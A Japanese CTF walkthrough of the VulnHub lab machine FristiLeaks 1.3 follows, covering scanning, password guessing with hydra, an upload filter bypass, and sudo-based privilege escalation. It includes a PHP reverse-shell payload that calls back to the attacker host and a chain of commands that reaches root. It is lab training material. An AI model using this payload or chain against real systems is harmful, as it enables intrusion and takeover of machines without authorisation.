# FristiLeaks: 1.3 CTF

https://www.vulnhub.com/entry/fristileaks-13,133/  
起動エラーのため、VirtualBox の設定で MAC アドレスを「080027A5A676」にする必要がある点に注意。

## 情報収集

ロゴとクレジット、Twitter のリンクがあるだけのページ

```html
<!-- Welcome to #Fristleaks, a quick hackme VM by @Ar0xA

Goal: get UID 0 (root) and read the special flag file.
Timeframe: should be doable in 4 hours.
-->
<html>
  <body bgcolor="#FF69B4">
    <br />
    <center>
      <h1>
        The
        <a href="https://twitter.com/search?q=%23fristileaks">#fristileaks</a>
        motto:
      </h1>
    </center>
    <center><img src="images/keep-calm.png" /></center>
    <br />
    Fristileaks 2015-12-11 are:<br />
    @meneer, @barrebas, @rikvduijn, @wez3forsec, @PyroBatNL, @0xDUDE,
    @annejanbrouwer, @Sander2121, Reinierk, @DearCharles, @miamat, MisterXE,
    BasB, Dwight, Egeltje, @pdersjant, @tcp130x10, @spierenburg, @ielmatani,
    @renepieters, Mystery guest, @EQ_uinix, @WhatSecurity, @mramsmeets, @Ar0xA
  </body>
</html>
```

### ポートスキャン

```shell
$ sudo nmap -sS -sV -A -p- 192.168.11.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 19:26 EST
Nmap scan report for 192.168.11.17
Host is up (0.0013s latency).
Not shown: 65355 filtered tcp ports (no-response), 179 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|firewall|storage-misc|media device
Running (JUST GUESSING): Linux 2.6.X|3.X (94%), WatchGuard Fireware 11.X (88%), Synology DiskStation Manager 5.X (87%), Dish embedded (86%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3.10 cpe:/o:watchguard:fireware:11.8 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/h:dish:hopper
Aggressive OS guesses: Linux 2.6.32 (94%), Linux 2.6.32 or 3.10 (89%), Linux 3.2 - 3.8 (88%), Linux 2.6.32 - 3.10 (88%), Linux 2.6.32 - 3.13 (88%), Linux 2.6.32 - 3.0 (88%), WatchGuard Fireware 11.8 (88%), Synology DiskStation Manager 5.1 (87%), Dish Network Hopper media device (86%), Linux 2.6.32 - 2.6.35 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.27 ms 192.168.11.17
```

HTTP だけ

### ディレクトリ探査

```shell
$ dirb http://192.168.11.17 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Dec  2 19:28:05 2024
URL_BASE: http://192.168.11.17/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.11.17/ ----
+ http://192.168.11.17/cgi-bin/ (CODE:403|SIZE:210)
==> DIRECTORY: http://192.168.11.17/images/
+ http://192.168.11.17/index.html (CODE:200|SIZE:703)
+ http://192.168.11.17/robots.txt (CODE:200|SIZE:62)

---- Entering directory: http://192.168.11.17/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Mon Dec  2 19:28:17 2024
DOWNLOADED: 4612 - FOUND: 3
```

### robots.txt

```shell
$ curl http://192.168.11.17/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

残念賞の画像が表示されただけ。  
手がかりがない。とりあえず nikto を実行する。

### nikto

```shell
$ nikto -h http://192.168.11.17
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.11.17
+ Target Hostname:    192.168.11.17
+ Target Port:        80
+ Start Time:         2024-12-02 19:32:51 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ /: Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /robots.txt: Entry '/beer/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cola/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/sisi/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 3 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.3.3 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.3 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8911 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2024-12-02 19:33:21 (GMT-5) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

HTTP TRACE は他人のブラウザから送信して情報を得るといった使い方はできるけど、今回は関係ないのではないか？

```php
$ curl http://192.168.11.17/#wp-config.php#
<!-- Welcome to #Fristleaks, a quick hackme VM by @Ar0xA

Goal: get UID 0 (root) and read the special flag file.
Timeframe: should be doable in 4 hours.
-->
<html>
<body bgcolor="#FF69B4">
<br />
<center><h1> The <a href="https://twitter.com/search?q=%23fristileaks">#fristileaks</a> motto:</h1> </center>
<center> <img src="images/keep-calm.png" /> </center>
<br />
Fristileaks 2015-12-11 are:<br>
@meneer, @barrebas, @rikvduijn, @wez3forsec, @PyroBatNL, @0xDUDE, @annejanbrouwer, @Sander2121, Reinierk, @DearCharles, @miamat, MisterXE, BasB, Dwight, Egeltje, @pdersjant, @tcp130x10, @spierenburg, @ielmatani, @renepieters, Mystery guest, @EQ_uinix, @WhatSecurity, @mramsmeets, @Ar0xA
</body>
</html>
```

### whatweb

```shell
$ whatweb -v 192.168.11.17
WhatWeb report for http://192.168.11.17
Status    : 200 OK
Title     : <None>
IP        : 192.168.11.17
Country   : RESERVED, ZZ

Summary   : Apache[2.2.15], HTTPServer[CentOS][Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3], PHP[5.3.3], WebDAV[2]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and
        maintain an open-source HTTP server for modern operating
        systems including UNIX and Windows NT. The goal of this
        project is to provide a secure, efficient and extensible
        server that provides HTTP services in sync with the current
        HTTP standards.

        Version      : 2.2.15 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        OS           : CentOS
        String       : Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3 (from server string)

[ PHP ]
        PHP is a widely-used general-purpose scripting language
        that is especially suited for Web development and can be
        embedded into HTML. This plugin identifies PHP errors,
        modules and versions and extracts the local file path and
        username if present.

        Version      : 5.3.3
        Google Dorks: (2)
        Website     : http://www.php.net/

[ WebDAV ]
        Web-based Distributed Authoring and Versioning (WebDAV) is
        a set of methods based on the Hypertext Transfer Protocol
        (HTTP) that facilitates collaboration between users in
        editing and managing documents and files stored on World
        Wide Web servers. - More Info:
        http://en.wikipedia.org/wiki/WebDAV

        Version      : 2

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Tue, 03 Dec 2024 00:46:11 GMT
        Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
        Last-Modified: Tue, 17 Nov 2015 18:45:47 GMT
        ETag: "31b2-2bf-524c0ef1d551d"
        Accept-Ranges: bytes
        Content-Length: 703
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

手がかりがなく困ったが、ふとホームページの「DRINK FRISTI」の部分が気になって URL を打ってみたら、admin portal のログイン画面が出てきた！

http://192.168.11.17/fristi/

ログイン POST

```http
POST /fristi/checklogin.php HTTP/1.1
Host: 192.168.11.17
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.11.17
Connection: keep-alive
Referer: http://192.168.11.17/fristi/
Upgrade-Insecure-Requests: 1

myusername=aaaaa&mypassword=bbbbb&Submit=Login
```

間違えたら「Wrong Username or Password」が返るパターン  
軽くシングルクォートを試したが、インジェクションの兆候は見えなかった

ホームページのクレジットからユーザーリストを作る

```text
0xDUDE
@0xDUDE
@Ar0xA
@DearCharles
@EQ_uinix
@PyroBatNL
@Sander2121
@WhatSecurity
@annejanbrouwer
@barrebas
@ielmatani
@meneer
@miamat
@mramsmeets
@pdersjant
@renepieters
@rikvduijn
@spierenburg
@tcp130x10
@wez3forsec
Ar0xA
BasB
DearCharles
Dwight
EQ_uinix
Egeltje
MisterXE
Mystery guest
PyroBatNL
Reinierk
Sander2121
WhatSecurity
annejanbrouwer
barrebas
ielmatani
meneer
miamat
mramsmeets
pdersjant
renepieters
rikvduijn
spierenburg
tcp130x10
wez3forsec
```

@が付いていたやつは、付いたままのと削除したのと 2 パターン用意。

ログイン画面の画像は HTML 内に Base64 で書かれており、コメント内の Base64 に置き換えたら、以下の文字列が出てきた。

```text
keKkeKKeKKeKkEkkEk
```

これをパスワードと想定して、作ったユーザーリストでブルートフォースする。

### ブルートフォース

```shell
$ hydra 192.168.11.17 http-post-form "/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^&Submit=Login:Wrong Username or Password" -L userlist.txt -p keKkeKKeKKeKkEkkEk
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-02 20:16:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 44 login tries (l:44/p:1), ~3 tries per task
[DATA] attacking http-post-form://192.168.11.17:80/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^&Submit=Login:Wrong Username or Password
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-02 20:16:06
```

ヒットしなかった。  
admin/keKkeKKeKKeKkEkkEk もダメだった。

HTML のコメントに「by eezeepz」と書かれていた。  
eezeepz / keKkeKKeKKeKkEkkEk でログイン成功。  
ファイルアップロード画面に遷移。

test.php をアップロードしようとしたらエラー。

```text
Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded
```

拡張子だけ変えて test.php.jpg にしたらアップロードできた。

```text
Uploading, please wait
The file has been uploaded to /uploads
```

test.php.jpg

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.11.9/1234 0>&1'") ?>
```

ブラウザで開いたら、リバースシェルが機能した。
192.168.11.17/fristi/uploads/test.php.jpg

```shell
$ nc -lvp 1234
listening on [any] 1234 ...
192.168.11.17: inverse host lookup failed: Unknown host
connect to [192.168.11.9] from (UNKNOWN) [192.168.11.17] 52320
bash: no job control in this shell
bash-4.1$
```

```shell
bash-4.1$ pwd
/var/www/html/fristi/uploads
bash-4.1$ whoami
apache
bash-4.1$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
```

```shell
bash-4.1$ ls -al /home/eezeepz
ls -al /home/eezeepz
total 2608
drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 .
drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old
-rw-r--r--. 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
-rwxr-xr-x. 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
-rwxr-xr-x. 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
-rwxr-xr-x. 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
-rwxr-xr-x. 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
-rwxr-xr-x. 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
-rwxr-xr-x. 1 eezeepz eezeepz  52936 Nov 17  2015 chgrp
-rwxr-xr-x. 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
-rwxr-xr-x. 1 eezeepz eezeepz  48712 Nov 17  2015 chmod
-rwxr-xr-x. 1 eezeepz eezeepz  53640 Nov 17  2015 chown
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 clock
-rwxr-xr-x. 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
-rwxr-xr-x. 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
-rwxr-xr-x. 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
-rwxr-xr-x. 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
-rwxr-xr-x. 1 eezeepz eezeepz  41704 Nov 17  2015 cut
-rwxr-xr-x. 1 eezeepz eezeepz  14832 Nov 17  2015 halt
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 hostname
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
-rwxr-xr-x. 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
-rwxr-xr-x. 1 eezeepz eezeepz  11576 Nov 17  2015 kill
-rwxr-xr-x. 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
-rwxr-xr-x. 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
-rwxr-xr-x. 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
-rwxr-xr-x. 1 eezeepz eezeepz 171784 Nov 17  2015 nano
-rwxr-xr-x. 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
-rwxr-xr-x. 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
-rwxr-xr-x. 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
-rwxr-xr-x. 1 eezeepz eezeepz  25208 Nov 17  2015 nice
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
-rwxr-xr-x. 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
-rwxr-xr-x. 1 eezeepz eezeepz 390616 Nov 17  2015 tar
-rwxr-xr-x. 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
-rwxr-xr-x. 1 eezeepz eezeepz 249000 Nov 17  2015 tc
-rwxr-xr-x. 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
-rwxr-xr-x. 1 eezeepz eezeepz  47928 Nov 17  2015 touch
-rwxr-xr-x. 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
-rwxr-xr-x. 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
-rwxr-xr-x. 1 eezeepz eezeepz  21112 Nov 17  2015 true
-rwxr-xr-x. 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
-rwxr-xr-x. 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
-rwxr-xr-x. 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
-rwxr-xr-x. 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
-rwxr-xr-x. 1 eezeepz eezeepz     62 Nov 17  2015 zcat
-rwxr-xr-x. 1 eezeepz eezeepz  47520 Nov 17  2015 zic
bash-4.1$ cat /home/eezeepz/notes.txt
cat /home/eezeepz/notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
bash-4.1$
```

- /tmp/runthis スクリプトが毎分、Jerry（admin）権限で実行される
- /tmp/cronresult にその結果が保存される

```shell
bash-4.1$ ls -al /tmp/runthis
ls: cannot access /tmp/runthis: No such file or directory
bash-4.1$ ls -al /tmp/cronresult
ls: cannot access /tmp/cronresult: No such file or directory
```

現状配置されてないので、スクリプトを入れておけば Jerry 権限で実行されるはず。  
/home/admin/ のパーミッションを変更した。

```shell
bash-4.1$ echo /home/admin/chmod 777 /home/admin > /tmp/runthis

bash-4.1$ ls -al /home/admin
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
-rw-r--r--. 1 admin     admin         18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 admin     admin        176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 admin     admin        124 Sep 22  2015 .bashrc
-rwxr-xr-x  1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x  1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r--  1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r--  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r--  1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x  1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x  1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x  1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt

bash-4.1$ cat /home/admin/whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG

bash-4.1$ cat /home/admin/cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

bash-4.1$ cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

パスワードを base64 エンコードして逆順にし、 rot13 処理したのが「mVGZ3O3omkJLmy2pcuTq」ということらしい。それが admin のパスワード？

```shell
$ echo 'mVGZ3O3omkJLmy2pcuTq' | rev | tr 'n-za-mN-ZA-M' 'a-zA-Z' | base64 --decode
thisisalsopw123

$ echo '=RFn0AKnlMHMPIzpyuTI0ITG' | rev | tr 'n-za-mN-ZA-M' 'a-zA-Z' | base64 --decode
LetThereBeFristi!
```

```shell
bash-4.1$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.1$ su - admin
su - admin
Password: thisisalsopw123

[admin@localhost ~]$
```

admin ユーザーでログインできた。

```shell
[admin@localhost ~]$ find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/bin/ping
/bin/ping6
/sbin/pam_timestamp_check
/sbin/unix_chkpwd
/usr/bin/crontab
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/passwd
/usr/libexec/openssh/ssh-keysign
/usr/libexec/pt_chown
/usr/sbin/suexec
/usr/sbin/usernetctl
```

特になし

fristigod ユーザーでログインしてみる

```shell
[admin@localhost ~]$ su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ pwd
/var/fristigod

-bash-4.1$ ls -al
ls -al
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff

-bash-4.1$ ls -al .secret_admin_stuff
ls -al .secret_admin_stuff
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .
drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom
-bash-4.1$
```

suid 付きの実行ファイルを見つけた。  
admin ユーザーでも fristigod ユーザーでも、「Nice try, but wrong user ;)」と言われる。

```shell
-bash-4.1$ ./doCom
Nice try, but wrong user ;)

-bash-4.1$ pwd
/var/fristigod/.secret_admin_stuff

-bash-4.1$ chmod 777 /var/fristigod
-bash-4.1$ chmod 777 /var/fristigod/.secret_admin_stuff
-bash-4.1$ exit
logout

[admin@localhost ~]$ /var/fristigod/.secret_admin_stuff/doCom
Nice try, but wrong user ;)
```

### sudo -l

```shell
-bash-4.1$ sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

```shell
-bash-4.1$ sudo /var/fristigod/.secret_admin_stuff/doCom
Sorry, user fristigod is not allowed to execute '/var/fristigod/.secret_admin_stuff/doCom' as root on localhost.localdomain.

-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
Usage: ./program_name terminal_command ...

-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls -al /root
total 48
dr-xr-x---.  3 root root 4096 Nov 25  2015 .
dr-xr-xr-x. 22 root root 4096 Dec  2 19:21 ..
-rw-------   1 root root 1936 Nov 25  2015 .bash_history
-rw-r--r--.  1 root root   18 May 20  2009 .bash_logout
-rw-r--r--.  1 root root  176 May 20  2009 .bash_profile
-rw-r--r--.  1 root root  176 Sep 22  2004 .bashrc
drwxr-xr-x.  3 root root 4096 Nov 25  2015 .c
-rw-r--r--.  1 root root  100 Sep 22  2004 .cshrc
-rw-------.  1 root root  246 Nov 17  2015 fristileaks_secrets.txt
-rw-------.  1 root root 1291 Nov 17  2015 .mysql_history
-rw-r--r--.  1 root root  129 Dec  3  2004 .tcshrc
-rw-------.  1 root root  829 Nov 17  2015 .viminfo

-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom cat /root/fristileaks_secrets.txt

Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)

Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

完了！

## 振り返り

- 外国には FRISTI って飲み物があるのかと思った。見慣れない単語は使えるかもしれないという教訓
- sudo を実行できるのは fristigod ユーザーだけど、sudo で実行する doCom は、fristi ユーザーとして実行しなければならないという、複雑なパターン

```shell
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls -al /root
```
